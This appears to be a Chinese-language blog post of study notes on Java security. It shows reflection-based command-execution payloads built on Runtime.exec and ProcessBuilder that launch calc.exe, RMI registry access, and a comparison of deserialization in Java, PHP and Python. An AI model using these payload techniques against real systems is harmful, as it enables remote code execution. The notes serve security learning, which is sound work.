<p>另外，我们经常在一些源码里看到，类名的部分包含 $ 符号，比如<em>fastjson</em>在 checkAutoType 时候就会 先将$ 替换成 . ：<a href="https://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fa">https://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fa</a> stjson&#x2F;parser&#x2F;ParserConfig.java#L1038。 $ 的作用是查找内部类。</p>
<p>Java的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： C1.class 和 C1$C2.class ，我们可以把他们看作两个无关的类，通过 Class.forName(“C1$C2”) 即可加载这个内 部类。</p>
<p><a href="https://www.jianshu.com/p/b10d006a14fd">Java 反射内部类 - 简书 (jianshu.com)</a></p>
<p>下面是自己写的demo：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        excute(<span class="string">&quot;org.example.test$hello&quot;</span>,<span class="string">&quot;sayHello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">excute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        Class clazz=Class.forName(className);</span><br><span class="line">        clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">hello</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> String name;</span><br><span class="line">        hello()&#123;</span><br><span class="line">            name=<span class="string">&quot;xcc&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>class.newInstance() 的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候 在写漏洞利用方法的时候，会发现使用 newInstance 总是不成功，这时候原因可能是： </p>
<ol>
<li>你使用的类没有无参构造函数 </li>
<li>你使用的类构造函数是私有的</li>
</ol>
<p>最常见的情况就是 java.lang.Runtime ，这个类在我们构造命令执行Payload的时候很常见，但 我们不能直接这样来执行命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>原因是 Runtime 类的构造方法是私有的。</p>
<p>类的私有原因设计到一种设计模式“单例模式”。</p>
<p>比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连 接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来 获取：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainDB</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">TrainDB</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrainDB</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TrainDB <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="title function_">TrainDB</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">// 建立连接的代码...</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样，只有类初始化的时候会执行一次构造函数，后面只能通过 getInstance 获取这个对象，避免建立多个数据库连接。</p>
<p>Runtime类就是单例模式，我们只能通过 Runtime.getRuntime() 来获取到 Runtime 对 象。我们将上述Payload进行修改即可正常执行命令了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),</span><br><span class="line"><span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这里用到了 getMethod 和 invoke 方法。 getMethod 的作用是通过反射获取一个类的某个特定的公有方法。而学过Java的同学应该清楚，Java中 支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要 传给他你需要获取的函数的参数类型列表。</p>
<p>Runtime.exec 方法有6个重载：</p>
<p>使用最简单的，也就是第一个，它只有一个参数，类型是String，所以我们使用 getMethod(“exec”, String.class) 来获取 Runtime.exec 方法。</p>
<p>invoke 的作用是执行方法，它的第一个参数是： </p>
<ul>
<li><p>如果这个方法是一个普通方法，那么第一个参数是类对象</p>
</li>
<li><p>如果这个方法是一个静态方法，那么第一个参数是类</p>
</li>
</ul>
<p>这也比较好理解了，我们正常执行方法是 [1].method([2], [3], [4]…) ，其实在反射里就是 method.invoke([1], [2], [3], [4]…) 。</p>
<p>将上述命令执行的Payload分解一下就是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(clazz);</span><br><span class="line">execMethod.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>现在有两个问题：</p>
<ul>
<li><p>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类 呢？ </p>
</li>
<li><p>如果一个方法或构造方法是私有方法，我们是否能执行它呢？</p>
</li>
</ul>
<p>下面在回答。</p>
<p><strong>第一个问题</strong>，我们需要用到一个新的反射方法 getConstructor 。</p>
<p> 和 getMethod 类似， getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须用参数列表类型才能唯一确定一个构造函数。</p>
<p> 获取到构造函数后，我们使用 newInstance 来执行。</p>
<p> 比如，我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start() 来执行命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)</span><br><span class="line">clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br></pre></td></tr></table></figure>

<p>ProcessBuilder有两个构造函数：</p>
<ul>
<li><p>public ProcessBuilder(List command) </p>
</li>
<li><p>public ProcessBuilder(String… command)</p>
</li>
</ul>
<p>我上面用到了第一个形式的构造函数，所以我在 getConstructor 的时候传入的是 List.class 。</p>
<p> 但是，我们看到，前面这个Payload用到了Java里的强制类型转换，有时候我们利用漏洞的时候（在表达式上下文中）是没有这种语法的。</p>
<p>所以，我们仍需利用反射来完成这一步。</p>
<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>

<p>通过 getMethod(“start”) 获取到start方法，然后 invoke 执行， invoke 的第一个参数就是ProcessBuilder Object了。</p>
<p><strong>第二个问题</strong></p>
<p>getDeclared 系列的反射了，与普通的 getMethod 、 getConstructor 区别是：</p>
<ul>
<li>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法</li>
<li>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了</li>
</ul>
<p>getDeclaredMethod 的具体用法和 getMethod 类似， getDeclaredConstructor 的具体用法和 getConstructor 类似。</p>
<p>过Runtime这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来 获取对象。其实现在我们也可以直接用 getDeclaredConstructor 来获取这个私有的构造方法来实例 化对象，进而执行命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><a href="https://developer.aliyun.com/article/330847">反射setAccessible()方法-阿里云开发者社区 (aliyun.com)</a></p>
<h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p><a href="https://wx.zsxq.com/dweb2/index/columns/2212251881">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
<p>RMI全称是Remote Method Invocation，远程⽅法调⽤。从这个名字就可以看出，他的⽬标和RPC其实 是类似的，是让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法，只不过RMI是Java独 有的⼀种机制。</p>
<p>⼀个例⼦</p>
<p>RMI Server:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span></span><br><span class="line">            <span class="title class_">IRemoteHelloWorld</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;call from&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⼀个RMI Server分为三部分：</p>
<ul>
<li>⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello() </li>
<li>⼀个实现了此接⼝的类 </li>
<li>⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server 了</li>
</ul>
<p>RMI Client：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.example.RMIServer;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        RMIServer.<span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIServer.IRemoteHelloWorld)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> hello.hello();</span><br><span class="line">        System.out.println( ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端就简单多了，使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象，后⾯的使⽤就和在 本地使⽤⼀样了。</p>
<p>虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时 候接⼝的重要性就体现了，这也是为什么我们前⾯要继承 Remote 并将我们需要调⽤的⽅法写在接⼝ IRemoteHelloWorld ⾥，因为客户端也需要⽤到这个接⼝。</p>
<p>流程：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230321185000707.png" alt="image-20230321185000707"></p>
<p>RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。</p>
<p><strong>利用codebase攻击RMI Registry。</strong><del>这部分云了</del></p>
<p><a href="https://wx.zsxq.com/dweb2/index/columns/2212251881">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
<p>一个RMI过程有以下三个参与者： RMI Registry 、RMI Server、 RMI Client</p>
<p>通常我们在新建一个RMI Registry的时候，都会 直接绑定一个对象在上面，也就是说我们示例代码中的Server其实包含了Registry和Server两部分：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());</span><br></pre></td></tr></table></figure>

<p>第一行创建并运行RMI Registry，第二行将RemoteHelloWorld对象绑定到Hello这个名字上。 Naming.bind 的第一个参数是一个URL，形如： rmi:&#x2F;&#x2F;host:port&#x2F;name 。</p>
<p>其中，host和port就是 RMI Registry的地址和端口，name是远程对象的名字。</p>
<p> 如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认 是 1099 ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Naming.bind(<span class="string">&quot;Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());</span><br></pre></td></tr></table></figure>

<p>以上就是RMI整个的原理与流程。接下来，我们很自然地想到，RMI会给我们带来哪些安全问题？ 从两个方向思考一下这个问题： </p>
<ol>
<li>如果我们能访问RMI Registry服务，如何对其攻击？ </li>
<li>如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地 址），能不能进行攻击？</li>
</ol>
<p>如何攻击RMI Registry？</p>
<p>MI Registry是一个远程对象管理的地方，可以理解为一个远程对象的“后台”。我们可以尝试直 接访问“后台”功能，比如修改远程服务器上Hello对应的对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">Naming.rebind(<span class="string">&quot;rmi://192.168.135.142:1099/Hello&quot;</span>, h);</span><br></pre></td></tr></table></figure>

<p>但是这样会报错，因为Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、 bind、unbind等方法。</p>
<p>不过list和lookup方法可以远程调用。 list方法可以列出目标上所有绑定的对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] s = Naming.list(<span class="string">&quot;rmi://192.168.135.142:1099&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>lookup作用就是获得某个远程对象。 那么，只要目标服务器上存在一些危险方法，我们通过RMI就可以对其进行调用。</p>
<p>classAnnotations是什么？</p>
<p>众所周知，在序列化Java类的时候用到了一个类，叫 ObjectOutputStream 。这个类内部有一个方法 annotateClass ， ObjectOutputStream 的子类有需要向序列化后的数据里放任何内容，都可以重写 这个方法，写入你自己想要写入的数据。然后反序列化时，就可以读取到这个信息并使用。</p>
<p>所以，我们在分析序列化数据时看到的 classAnnotations ，实际上就是 annotateClass 方法写入的 内容。</p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="不同语言的反序列化"><a href="#不同语言的反序列化" class="headerlink" title="不同语言的反序列化"></a>不同语言的反序列化</h3><p>为什么反序列化常常会带来安全隐患？</p>
<p> 一门成熟的语言，如果需要在网络上传递信息，通常会用到一些格式化数据，比如： JSON XML JSON和XML是通用数据交互格式，通常用于不同语言、不同环境下数据的交互，比如前端的JavaScript 通过JSON和后端服务通信、微信服务器通过XML和公众号服务器通信。</p>
<p>但这两个数据格式都有一个共 同的问题：不支持复杂的数据类型。 </p>
<p>大多数处理方法中，JSON和XML支持的数据类型就是基本数据类型，整型、浮点型、字符串、布尔 等，如果开发者希望在传输数据的时候直接传输一个对象，那么就不得不想办法扩展基础的 JSON（XML）语法。</p>
<p> 比如，Jackson和Fastjson这类序列化库，在JSON（XML）的基础上进行改造，通过特定的语法来传递 对象；亦或者如RMI，直接使用Java等语言内置的序列化方法，将一个对象转换成一串二进制数据进行 传输。 </p>
<p>不管是Jackson、Fastjson还是编程语言内置的序列化方法，一旦涉及到序列化与反序列化数据，就可 能会涉及到安全问题。</p>
<p>但首先要理解的是，“反序列化漏洞”是对一类漏洞的泛指，而不是专指某种反序 列化方法导致的漏洞，比如Jackson反序列化漏洞和Java readObject造成的反序列化漏洞就是完全不同 的两种漏洞。</p>
<h4 id="反序列化方法的对比"><a href="#反序列化方法的对比" class="headerlink" title="反序列化方法的对比"></a>反序列化方法的对比</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java的反序列化和PHP的反序列化其实有点类似，他们都只能将一个对象中的属性按照某种特定的格式生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象。</span><br><span class="line"></span><br><span class="line">但Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者 在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取。</span><br><span class="line"></span><br><span class="line">当然，PHP中也提供了一个魔术方法叫 __wakeup ，在反序列化的时候进行触发。很多人会认为Java的 readObject 和PHP的 __wakeup 类似，但其实不全对，虽然都是在反序列化的时候触发，但他们解决 的问题稍微有些差异。 </span><br><span class="line"></span><br><span class="line">java设计 readObject 的思路和PHP的 __wakeup 不同点在于： </span><br><span class="line">readObject 倾向于解决“反序列化时如何还原一个完整对象”这个问题，而PHP的 __wakeup 更倾向于解决“反序列化后如何初始化这个对象”的问题。 </span><br><span class="line">但这个设计理念可以说是决定为什么Java的反序列化漏洞这么多的根本原因。</span><br></pre></td></tr></table></figure>

<h4 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP的序列化是开发者不能参与的，开发者调用 serialize 函数后，序列化的数据就已经完成了，你得到的是一个完整的对象，你并不能在序列化数据流里新增某一个内容，你如果想插入新的内容，只有将其保存在一个属性中。也就是说PHP的序列化、反序列化是一个纯内部的过程，而其 __sleep 、__wakeup 魔术方法的目的就是在序列化、反序列化的前后执行一些操作。</span><br></pre></td></tr></table></figure>

<p>一个非常典型的PHP序列化例子，就是含有资源类型的PHP类，如数据库连接：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$link</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;dsn = <span class="variable">$dsn</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;link = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$this</span>-&gt;dsn, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-</span><br><span class="line">&gt;password);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PHP中，资源类型的对象默认是不会写入序列化数据中的。那么上述Connection类的 $link 属性在序 列化后就是null，反序列化时拿到的也是null。 那么，如果我想要反序列化时拿到的 $link 就是一个数据库连接，我就需要编写 __wakeup 方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$link</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;dsn = <span class="variable">$dsn</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;link = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$this</span>-&gt;dsn, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-</span><br><span class="line">&gt;password);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;dsn&#x27;</span>, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java反序列化的操作，很多是需要开发者深入参与的，所以你会发现大量的库会实现 readObject 、writeObject 方法，这和PHP中 __wakeup 、 __sleep 很少使用是存在鲜明对比的。</span><br><span class="line">这次再来说说objectAnnotation。</span><br></pre></td></tr></table></figure>

<p>Java在序列化时一个对象，将会调用这个对象中的 writeObject 方法，参数类型是ObjectOutputStream ，开发者可以将任何内容写入这个stream中；反序列化时，会调用 readObject ，开发者也可以从中读取出前面写入的内容，并进行处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line"><span class="keyword">public</span> String name;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">Person(String name, <span class="type">int</span> age) &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line"><span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span></span><br><span class="line">IOException &#123;</span><br><span class="line">s.defaultWriteObject();</span><br><span class="line">s.writeObject(<span class="string">&quot;This is a object&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line"><span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">s.defaultReadObject();</span><br><span class="line"><span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> (String) s.readObject();</span><br><span class="line">System.out.println(message);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里在执行完默认的 s.defaultWriteObject() 后，向stream里写入了一个字符串 This is a object 。</p>
<p>我们写入的字符串 This is a object 被放在 objectAnnotation 的位置。</p>
<p>在反序列化时，读取了这个字符串，并将其输出。</p>
<h4 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h4><p>Python反序列化和Java、PHP有个显著的区别，就是Python的反序列化过程实际上是在执行一个基于 栈的虚拟机。我们可以向栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序。 所以，Python的反序列化可以立即导致任意函数、命令执行漏洞，与需要gadget的PHP和Java相比更加 危险。</p>
